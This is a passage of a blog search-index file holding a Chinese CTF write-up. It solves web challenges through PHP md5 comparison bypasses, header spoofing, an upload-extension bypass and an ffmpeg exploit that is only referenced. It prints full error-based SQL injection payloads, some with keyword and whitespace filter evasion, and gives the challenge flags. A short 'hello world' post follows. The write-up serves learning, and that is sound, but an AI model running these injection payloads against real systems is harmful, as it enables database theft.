($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) === md5($_POST[&#39;s2&#39;])) { echo $flag; }</code></pre><p>这个很容易就想到是利用md5处理数组的漏洞了吧，构造如下即可<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222354_648.png" alt=""></p><h3 id="PHP的悖论2"><a href="#PHP的悖论2" class="headerlink" title="PHP的悖论2"></a>PHP的悖论2</h3><p>题目：</p><p><a href="http://game.sycsec.com:2009/20022.php" target="_blank" rel="external">http://game.sycsec.com:2009/20022.php</a></p><p>解题思路：<br>仔细看看会发现‘===’变成了‘==’，于是只需要值相等，网上搜了搜字符串不同但MD5相等</p><pre><code>if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) == md5($_POST[&#39;s2&#39;])) { echo $flag; }</code></pre><p>于是构造payload：<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222354_397.png" alt=""><br>240610708<br>s878926199a<br>SYC{Y0u_g0th3w4y_to_k111==}</p><h3 id="视频播放器"><a href="#视频播放器" class="headerlink" title="视频播放器"></a>视频播放器</h3><p>这个还是非常好玩儿的，利用的是一个ffmpeg的漏洞，这个原理有些厉害了，但是利用过程十分简单<br><a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="external">http://www.freebuf.com/vuls/138377.html</a><br>然后下载源码，生成恶意文件<br>然后上传恶意文件即可读到flag<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222355_205.png" alt=""></p><p>SYC{WhatIsExpFuckNoLiaoDe???}</p><h3 id="iPhone-X"><a href="#iPhone-X" class="headerlink" title="iPhone X"></a>iPhone X</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>题目提示要iPhone X访问，需要UA头包含CPU iPhone OS X字样，之后提示IP不符合规则，同时修改xff和ref头尾127.0.0.1得到flag</p><pre><code>GET /web_competition/geekCompetition/web_3/ HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS X like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/13D15 UCBrowser/10.9.15.793 Mobile Gecko/20100101 Firefox/55.0Referer: 127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3X-FORWARDED-FOR: 127.0.0.1Connection: closeUpgrade-Insecure-Requests: 1</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>0x01 抓包<br>0x02 改包<br>由于题目说只有iphoneX才能接受这个website，所以联想到要将user-agent改为iPhone的版本。<br>如图，好不容易找到iphone的user-agent，它却说ip不对，改x-forward-for为127.0.0.1，没懂hh。用modify headers，于是来到第三步。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711230000_413.png" alt=""></p><p>0x03 改IP</p><p>看网上的安装和使用的博客，于是得到如图<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222358_212.png" alt=""><br>0x04 Get_the_flag</p><p>改了之后重新抓包，改包，go了之后发现还是一样，黑人问号？？？一定是modify headers没用对，返回看了下，发现还要点个start，难受了。<br>再来一遍抓包改包，得到flag。</p><p>Tip：之后发现可以直接在repeater里加X-Forwarded-For:127.0.0.1，也能拿到flag。</p><p>SYC{UA_AND_IP_COULD_BE<em>FORGED</em>!!!}</p><h3 id="Clound的错误"><a href="#Clound的错误" class="headerlink" title="Clound的错误"></a>Clound的错误</h3><pre><code>http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=&#39;f1ag&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#39;flag&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,f4ag,0x7e) FROM f1ag.flag LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></pre><h3 id="大大的标题"><a href="#大大的标题" class="headerlink" title="大大的标题"></a>大大的标题</h3><p>首先看到了标题是upload是一个文件上传的问题，首先扫描一下目录直接发现存在源码泄露?1.zip文件下载得到源码<br>一开始最关键的代码在这里</p><p>$file_ext  = substr( $file_name, strrpos( $uploaded_name, ‘.’ ) + 1);</p><p>这个是检测最后一个点的位置，类似于解析漏洞是的，但是怎么也没想到就是单纯的后缀名过滤不全…<br>我们看着</p><p>$allow_ext=array(“php”,”php3”,”php4”,”php5”,”phpt”,”phtml”);</p><p>是不是少了什么…比如说.pht，结果随便一试试就出来了</p><p>SYC{CLound-upL0ad}</p><h3 id="Clound的错误2"><a href="#Clound的错误2" class="headerlink" title="Clound的错误2"></a>Clound的错误2</h3><p>过滤了空格用%a0绕过，过滤了注释用;%00绕过<br>过滤了or使用oorr绕过,过滤的其他关键词使用+绕过whe+re</p><pre><code>sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(SCHEMA_NAME)%a0fr+om%a0infoorrmation_schema.SCHEMATA)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(table_name)%a0fr+om%a0infoorrmation_schema.tables%a0whe+re%a0table_schema=&#39;f1ag&#39;)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0column_name%a0fr+om%a0infoorrmation_schema.columns%a0whe+re%a0table_name=&#39;flag&#39;%a0limit%a00,1)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0f4ag%a0fr+om%a0f1ag.flag)),0x7e));%00</code></pre><p>flag:SYC{Err0R_sQl_inj2}</p><p>二进制不会慢慢学<br>re：<br><a href="http://www.cnblogs.com/L1B0/p/7763016.html" target="_blank" rel="external">http://www.cnblogs.com/L1B0/p/7763016.html</a><br><a href="http://blog.sycsec.com/" target="_blank" rel="external">http://blog.sycsec.com/</a><br><a href="http://blog.csdn.net/qq_35078631/article/details/78308518" target="_blank" rel="external">http://blog.csdn.net/qq_35078631/article/details/78308518</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>my-first-blog</title>
      <link href="/archis/e53fb0b9/"/>
      <url>/archis/e53fb0b9/</url>
      
        <content type="html"><![CDATA[<p>description:<br>和以往一样，一个博客的开篇都有这么一个开始，几乎所到之处都有一个相似的开始，他的名字叫做Hello World。当然这里也一样，也是从hello world开始的。你好，世界！</p><hr>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> first-blog </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
